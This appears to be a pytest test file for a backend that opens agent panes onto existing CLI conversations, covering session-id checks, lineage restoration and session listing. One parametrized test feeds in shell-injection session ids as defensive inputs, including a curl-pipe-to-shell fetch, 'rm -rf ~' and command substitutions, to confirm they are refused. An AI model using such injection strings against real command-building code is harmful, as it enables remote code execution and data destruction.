"""Opening a pane onto an EXISTING CLI conversation.

Two things were missing and are covered here. cli_list_sessions answers "which
conversations could a pane be opened onto", reading the ids out of the
workspace's spawn history; cli_open_agent(session_id=...) opens a pane that
launches with the vendor's own resume syntax instead of starting fresh.

The id is checked against the vendor's session store BEFORE the spawn is
broadcast, which is the point of most of these tests: a pane that opens and
silently starts an empty conversation is indistinguishable from a successful
resume until someone reads the transcript, and by then the caller has sent a
follow-up that makes no sense to a CLI with no memory of what it follows.
"""

from __future__ import annotations

import asyncio
from types import SimpleNamespace
from typing import Any

import pytest

from agent_team_backend import agent_messaging, app
from agent_team_backend.mcp_server import (
    auth as plan_mcp_auth,
    server as plan_mcp,
    wiring as plan_mcp_wiring,
)


@pytest.fixture(autouse=True)
def _clean_registry() -> Any:
    agent_messaging._reset_for_test()
    yield
    agent_messaging._reset_for_test()


@pytest.fixture
def captured(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []

    async def fake_broadcast(event: dict[str, Any], **_kwargs: Any) -> None:
        events.append(event)

    monkeypatch.setattr(app, "broadcast", fake_broadcast)
    return events


@pytest.fixture
def session_on_disk(monkeypatch: pytest.MonkeyPatch) -> set[tuple[str, str]]:
    """The sessions the vendors claim to have. Empty = nothing is resumable."""
    known: set[tuple[str, str]] = set()

    def fake_exists(agent: str, workspace_path: str, session_id: str) -> bool:
        return (agent, session_id) in known

    monkeypatch.setattr(app, "_session_exists", fake_exists)
    return known


def _ctx(pane_id: str = "pa") -> Any:
    params = {"pane": pane_id, "t": plan_mcp_wiring.caller_token(pane_id)}
    return SimpleNamespace(
        request_context=SimpleNamespace(request=SimpleNamespace(query_params=params))
    )


def _hostless_ctx() -> Any:
    """A caller with no pane identity — the backend's own host credential.

    It stands in for an external client here: both have no pane, therefore no
    workspace of their own, which is the property these tests are about.
    """
    params = {"client": "host", "t": plan_mcp_auth.internal_token()}
    return SimpleNamespace(
        request_context=SimpleNamespace(request=SimpleNamespace(query_params=params))
    )


async def _answer_spawn(pane_id: str = "child-1", name: str = "reviewer") -> str:
    """Stand in for the window answering the spawn verdict."""
    for _ in range(400):
        keys = list(plan_mcp._pending_spawns)
        if keys:
            agent_messaging.register(pane_id, name, "/ws/alpha")
            plan_mcp.resolve_spawn(keys[0], {"ok": True, "pane_id": pane_id, "name": name})
            return keys[0]
        await asyncio.sleep(0.005)
    raise AssertionError("cli_open_agent never broadcast its spawn request")


async def _run_open(**kwargs: Any) -> dict[str, Any]:
    """cli_open_agent with a window that answers both verdicts."""

    async def window() -> None:
        request_id = await _answer_spawn()
        plan_mcp.resolve_kickoff(request_id, {"pane_id": "child-1", "kickoff": "sent"})

    task = asyncio.create_task(window())
    try:
        return await plan_mcp.cli_open_agent(**kwargs)
    finally:
        task.cancel()
        await asyncio.gather(task, return_exceptions=True)


def _spawn_payload(captured: list[dict[str, Any]]) -> dict[str, Any]:
    for event in captured:
        if event.get("type") == "agent_spawn.request":
            return event["payload"]
    raise AssertionError("no agent_spawn.request was broadcast")


# ── cli_open_agent(session_id=...) ─────────────────────────────────────────
@pytest.mark.asyncio
async def test_resume_puts_the_session_id_in_the_spawn_request(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]]
) -> None:
    """The window needs the id to build `claude --resume <id>`."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    session_on_disk.add(("claude", "sess-abc"))

    result = await _run_open(
        agent="claude", name="reviewer", task="carry on", ctx=_ctx(), session_id="sess-abc"
    )

    assert result["ok"] is True
    # Echoed back so the caller can tell a resumed pane from a fresh one.
    assert result["resumed_session_id"] == "sess-abc"
    assert _spawn_payload(captured)["session_id"] == "sess-abc"


@pytest.mark.asyncio
async def test_an_ordinary_spawn_carries_no_session_id_at_all(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]]
) -> None:
    """Absent, not empty: an older window must not read '' as a session."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")

    result = await _run_open(agent="codex", name="reviewer", task="review", ctx=_ctx())

    assert "session_id" not in _spawn_payload(captured)
    assert "resumed_session_id" not in result


@pytest.mark.asyncio
async def test_an_unknown_session_is_refused_before_anything_is_opened(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]]
) -> None:
    """The failure this whole path exists to prevent: a pane that opens fresh
    while claiming to have resumed."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")

    result = await plan_mcp.cli_open_agent(
        "claude", "reviewer", "carry on", _ctx(), session_id="ghost"
    )

    assert result["ok"] is False
    assert result["error_code"] == "unknown-session-id"
    # Nothing was broadcast — no pane opened, nothing to clean up.
    assert [e for e in captured if e.get("type") == "agent_spawn.request"] == []
    assert plan_mcp._pending_spawns == {}
    assert plan_mcp._pending_kickoffs == {}


@pytest.mark.asyncio
async def test_pane_id_and_session_id_together_are_refused(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]]
) -> None:
    """They are opposite operations: reopen what Navide holds vs. open a new
    pane onto an old conversation. Silently preferring one would surprise."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    session_on_disk.add(("claude", "sess-abc"))

    result = await plan_mcp.cli_open_agent(
        "claude", "reviewer", "carry on", _ctx(), pane_id="pb", session_id="sess-abc"
    )

    assert result["ok"] is False
    assert result["error_code"] == "conflicting-target"
    assert [e for e in captured if e.get("type") == "agent_spawn.request"] == []


@pytest.mark.parametrize(
    "evil",
    [
        "abc; curl evil.sh | sh",
        "abc && rm -rf ~",
        "abc`id`",
        "abc$(id)",
        "abc | tee /tmp/x",
        "abc\nid",
        "abc 'quoted'",
        "abc > /tmp/x",
    ],
)
@pytest.mark.asyncio
async def test_a_session_id_that_would_be_shell_syntax_is_refused(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]], evil: str
) -> None:
    """The id is interpolated into a command string that runs as
    `[shell, '-ilc', cmd]`, so shape is a shell-safety boundary and not a
    formatting preference.

    The on-disk check alone does not cover this: a FILENAME may legally contain
    a semicolon and a space, so anything able to write into a vendor's session
    directory could otherwise turn a resume into arbitrary execution. Note the
    id is marked as existing here — the refusal must come from the shape, not
    from the lookup.
    """
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    session_on_disk.add(("claude", evil))

    result = await plan_mcp.cli_open_agent(
        "claude", "reviewer", "carry on", _ctx(), session_id=evil
    )

    assert result["ok"] is False
    assert result["error_code"] == "malformed-session-id"
    assert [e for e in captured if e.get("type") == "agent_spawn.request"] == []


@pytest.mark.parametrize(
    "real",
    [
        "0072be2a-32ab-45ff-880d-df10d2a8e0b8",  # claude / cursor / qwen / pi
        "ses_8f3a21c0",  # opencode / kilo
        "session_0072be2a-32ab-45ff-880d-df10d2a8e0b8",  # kimi
        "12ab34cd",  # grok
        "sessions/2026/09/rollout-01.jsonl",  # codex: an id that is a path
    ],
)
@pytest.mark.asyncio
async def test_the_shape_guard_accepts_every_vendor_s_real_id_format(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]], real: str
) -> None:
    """A guard that rejected a legitimate id would break resume for that whole
    vendor, so the accepted set is pinned alongside the rejected one."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    session_on_disk.add(("claude", real))

    result = await _run_open(
        agent="claude", name="reviewer", task="carry on", ctx=_ctx(), session_id=real
    )

    assert result["ok"] is True
    assert result["resumed_session_id"] == real


@pytest.mark.asyncio
async def test_aider_is_refused_because_it_has_no_session_ids(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]]
) -> None:
    """aider restores from a chat-history FILE, so no id could mean anything —
    and app._session_exists' fallback would have answered True for it."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    session_on_disk.add(("aider", "whatever"))

    result = await plan_mcp.cli_open_agent(
        "aider", "helper", "carry on", _ctx(), session_id="whatever"
    )

    assert result["ok"] is False
    assert result["error_code"] == "no-session-support"


@pytest.mark.asyncio
async def test_a_vendor_without_its_own_disk_check_is_still_resumable(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]]
) -> None:
    """grok declares no `session_exists` of its own — it resumes through
    app._session_exists' path fallback. Reading that absence as "cannot resume"
    would refuse a CLI that resumes perfectly well."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    session_on_disk.add(("grok", "12ab34cd"))

    result = await _run_open(
        agent="grok", name="reviewer", task="carry on", ctx=_ctx(), session_id="12ab34cd"
    )

    assert result["ok"] is True
    assert result["resumed_session_id"] == "12ab34cd"


@pytest.mark.asyncio
async def test_a_caller_with_no_pane_must_name_the_workspace_to_resume_in(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]]
) -> None:
    """Sessions are per project, and a host/external caller has no project."""
    result = await plan_mcp.cli_open_agent(
        "claude", "reviewer", "carry on", _hostless_ctx(), session_id="sess-abc"
    )

    assert result["ok"] is False
    # It never reaches the session check: workspace_path is required first.
    assert "workspace_path" in result["error"]
    assert [e for e in captured if e.get("type") == "agent_spawn.request"] == []


# ── lineage: a resume goes back where it was ───────────────────────────────
@pytest.fixture
def pane_records(monkeypatch: pytest.MonkeyPatch) -> list[Any]:
    """The workspace's pane records — where a conversation's position lives."""
    records: list[Any] = []

    class _Project:
        panes = records

    # peek, not load_or_create — the lookup must never create a document.
    monkeypatch.setattr(app.project_store, "peek", lambda ws: _Project())
    return records


def _record(agent: str, session_id: str, spawned_by: str = "", group: str = "") -> Any:
    return SimpleNamespace(
        agent=agent, session_id=session_id, spawned_by=spawned_by,
        run_group_id=group, origin="manual", spawn_status="removed",
    )


@pytest.mark.asyncio
async def test_a_resume_is_parented_where_the_conversation_was(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]],
    pane_records: list[Any],
) -> None:
    """Not a new child of the caller: the pane goes back under its own parent.

    The pane record outlives the pane (closing sets spawn_status "removed"
    rather than deleting), so the position a long-gone conversation sat in is
    still on disk.
    """
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    session_on_disk.add(("claude", "sess-abc"))
    pane_records.append(_record("claude", "sess-abc", spawned_by="old-parent", group="rg-7"))

    result = await _run_open(
        agent="claude", name="reviewer", task="carry on", ctx=_ctx(), session_id="sess-abc"
    )

    payload = _spawn_payload(captured)
    assert payload["resume_spawned_by"] == "old-parent"
    assert payload["resume_run_group_id"] == "rg-7"
    assert result["restored_lineage"] == {
        "spawned_by": "old-parent",
        "run_group_id": "rg-7",
    }


@pytest.mark.asyncio
async def test_a_root_conversation_goes_back_to_the_root(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]],
    pane_records: list[Any],
) -> None:
    """An empty parent is an ANSWER, not a missing value.

    The pane was a root; resuming it must not quietly adopt it onto whoever
    asked. The key is therefore sent empty rather than left out, because an
    absent key is what the window would read as "no lineage, parent to the
    caller".
    """
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    session_on_disk.add(("claude", "sess-root"))
    pane_records.append(_record("claude", "sess-root", spawned_by="", group="rg-1"))

    await _run_open(
        agent="claude", name="reviewer", task="carry on", ctx=_ctx(), session_id="sess-root"
    )

    payload = _spawn_payload(captured)
    assert "resume_spawned_by" in payload
    assert payload["resume_spawned_by"] == ""


@pytest.mark.asyncio
async def test_the_newest_record_wins_when_several_name_one_session(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]],
    pane_records: list[Any],
) -> None:
    """Every rebuild writes a fresh record for the same conversation; the last
    is the position it was most recently in."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    session_on_disk.add(("claude", "sess-x"))
    pane_records.append(_record("claude", "sess-x", spawned_by="first", group="rg-old"))
    pane_records.append(_record("claude", "sess-x", spawned_by="latest", group="rg-new"))

    await _run_open(
        agent="claude", name="reviewer", task="carry on", ctx=_ctx(), session_id="sess-x"
    )

    assert _spawn_payload(captured)["resume_spawned_by"] == "latest"


@pytest.mark.asyncio
async def test_an_ordinary_spawn_carries_no_lineage_keys(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]],
    pane_records: list[Any],
) -> None:
    """Only a resume repositions a pane; a fresh one is the caller's child as
    it has always been, and an older window must not see keys it would act on."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")

    await _run_open(agent="codex", name="reviewer", task="review", ctx=_ctx())

    payload = _spawn_payload(captured)
    assert "resume_spawned_by" not in payload
    assert "resume_run_group_id" not in payload


@pytest.mark.asyncio
async def test_a_conversation_with_no_record_left_reports_empty_lineage(
    captured: list[dict[str, Any]], session_on_disk: set[tuple[str, str]],
    pane_records: list[Any],
) -> None:
    """The transcript is on disk but the project document has forgotten the
    pane. There is no position to restore, so both keys are empty — and still
    present, so the window does not fall back to parenting on the caller."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    session_on_disk.add(("claude", "orphan"))

    await _run_open(
        agent="claude", name="reviewer", task="carry on", ctx=_ctx(), session_id="orphan"
    )

    payload = _spawn_payload(captured)
    assert payload["resume_spawned_by"] == ""
    assert payload["resume_run_group_id"] == ""


@pytest.mark.asyncio
async def test_listing_sessions_never_creates_a_project_document(
    history: list[dict[str, Any]], session_on_disk: set[tuple[str, str]],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """cli_list_sessions is read-only and reachable by an external client with
    any directory as workspace_path; the lineage lookup must peek, never
    load_or_create — which would write a fresh project document there."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    history.append({"paneId": "p1", "agentKey": "claude", "sessionId": "s1"})
    session_on_disk.add(("claude", "s1"))
    created: list[str] = []
    monkeypatch.setattr(app.project_store, "load_or_create", lambda ws: created.append(ws))
    monkeypatch.setattr(app.project_store, "peek", lambda ws: None)

    result = await plan_mcp.cli_list_sessions(_ctx())

    assert result["ok"] is True
    assert created == []
    # No record -> no position, and the row still comes back.
    assert result["sessions"][0]["spawned_by"] == ""


@pytest.mark.asyncio
async def test_a_placeholder_is_not_live(
    history: list[dict[str, Any]], session_on_disk: set[tuple[str, str]]
) -> None:
    """`live` means a CLI is holding the conversation. A cold-restore
    placeholder is registered but has no CLI, so resuming it forks nothing —
    and steering the caller to cli_send would queue against a pane with no
    PTY."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    agent_messaging.register("p1", "sleeper", "/ws/alpha", agent_key="claude", realized=False)
    history.append({"paneId": "p1", "agentKey": "claude", "sessionId": "s1"})
    session_on_disk.add(("claude", "s1"))

    result = await plan_mcp.cli_list_sessions(_ctx())

    assert result["sessions"][0]["live"] is False


# ── cli_list_sessions ──────────────────────────────────────────────────────
@pytest.fixture
def history(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
    """The workspace's spawn history, newest first (what read_page returns)."""
    rows: list[dict[str, Any]] = []

    def fake_read_page(
        workspace_path: str, *, offset: int = 0, limit: int = 100, seed: Any = None
    ) -> tuple[list[dict[str, Any]], int]:
        return rows[offset : offset + limit], len(rows)

    monkeypatch.setattr(app.spawn_history_store, "read_page", fake_read_page)
    return rows


@pytest.mark.asyncio
async def test_list_sessions_reports_what_can_and_cannot_be_resumed(
    history: list[dict[str, Any]], session_on_disk: set[tuple[str, str]]
) -> None:
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    history.extend(
        [
            {"paneId": "p1", "agentKey": "claude", "sessionId": "keep", "customName": "one"},
            {"paneId": "p2", "agentKey": "codex", "sessionId": "gone", "customName": "two"},
        ]
    )
    session_on_disk.add(("claude", "keep"))

    result = await plan_mcp.cli_list_sessions(_ctx())

    assert result["ok"] is True
    by_id = {row["session_id"]: row for row in result["sessions"]}
    assert by_id["keep"]["resumable"] is True
    assert by_id["keep"]["agent_key"] == "claude"
    # Listed, but marked — the transcript is gone, so cli_open_agent refuses it.
    assert by_id["gone"]["resumable"] is False


@pytest.mark.asyncio
async def test_one_conversation_is_listed_once_however_many_panes_held_it(
    history: list[dict[str, Any]], session_on_disk: set[tuple[str, str]]
) -> None:
    """A rebuilt or restored pane writes a NEW history entry with the same
    session id; resuming any of them resumes the one conversation."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    history.extend(
        [
            {"paneId": "p3", "agentKey": "claude", "sessionId": "same"},
            {"paneId": "p2", "agentKey": "claude", "sessionId": "same"},
            {"paneId": "p1", "agentKey": "claude", "sessionId": "same"},
        ]
    )
    session_on_disk.add(("claude", "same"))

    result = await plan_mcp.cli_list_sessions(_ctx())

    assert [row["session_id"] for row in result["sessions"]] == ["same"]
    # The newest pane wins, because read_page hands them back newest first.
    assert result["sessions"][0]["pane_id"] == "p3"


@pytest.mark.asyncio
async def test_a_session_whose_pane_is_still_open_is_flagged_live(
    history: list[dict[str, Any]], session_on_disk: set[tuple[str, str]]
) -> None:
    """Resuming a live session into a second pane forks it — the caller has to
    be able to tell, and cli_send to the live pane is the right move instead."""
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    agent_messaging.register("p1", "worker", "/ws/alpha", agent_key="claude")
    history.extend(
        [
            {"paneId": "p1", "agentKey": "claude", "sessionId": "live-one"},
            {"paneId": "p9", "agentKey": "claude", "sessionId": "dead-one"},
        ]
    )
    session_on_disk.update({("claude", "live-one"), ("claude", "dead-one")})

    result = await plan_mcp.cli_list_sessions(_ctx())
    by_id = {row["session_id"]: row for row in result["sessions"]}

    assert by_id["live-one"]["live"] is True
    assert by_id["dead-one"]["live"] is False

    only_live = await plan_mcp.cli_list_sessions(_ctx(), include_gone=False)
    assert [row["session_id"] for row in only_live["sessions"]] == ["live-one"]


@pytest.mark.asyncio
async def test_list_sessions_filters_by_vendor_and_skips_unbound_panes(
    history: list[dict[str, Any]], session_on_disk: set[tuple[str, str]]
) -> None:
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    history.extend(
        [
            {"paneId": "p1", "agentKey": "claude", "sessionId": "c1"},
            {"paneId": "p2", "agentKey": "codex", "sessionId": "x1"},
            # A pane that never bound a session has nothing to resume.
            {"paneId": "p3", "agentKey": "claude", "sessionId": ""},
        ]
    )
    session_on_disk.update({("claude", "c1"), ("codex", "x1")})

    result = await plan_mcp.cli_list_sessions(_ctx(), agent="claude")

    assert [row["session_id"] for row in result["sessions"]] == ["c1"]


@pytest.mark.asyncio
async def test_list_sessions_needs_a_workspace_from_a_caller_without_one(
    history: list[dict[str, Any]]
) -> None:
    result = await plan_mcp.cli_list_sessions(_hostless_ctx())

    assert result["ok"] is False
    assert result["error_code"] == "workspace-required"


# ── the roster is deliberately NOT part of this ────────────────────────────
@pytest.mark.asyncio
async def test_the_roster_shape_is_left_alone_by_all_of_this() -> None:
    """cli_list_sessions carries `agent_key` per row so the roster does not
    have to.

    Adding it there was tempting and wrong: cli_list_targets is the most
    frequently called tool of the lot, its shape is pinned on purpose (see
    test_plan_mcp_whoami.test_list_targets_still_answers_exactly_as_it_did),
    and both cli_get_status and cli_list_sessions already answer which CLI a
    pane runs. Pinned from this side too, so the temptation is refused once.
    """
    agent_messaging.register("pa", "lead", "/ws/alpha", agent_key="claude")
    agent_messaging.register("pb", "helper", "/ws/alpha", agent_key="codex")

    roster = await plan_mcp.cli_list_targets(_ctx())

    assert "agent_key" not in roster["targets"][0]
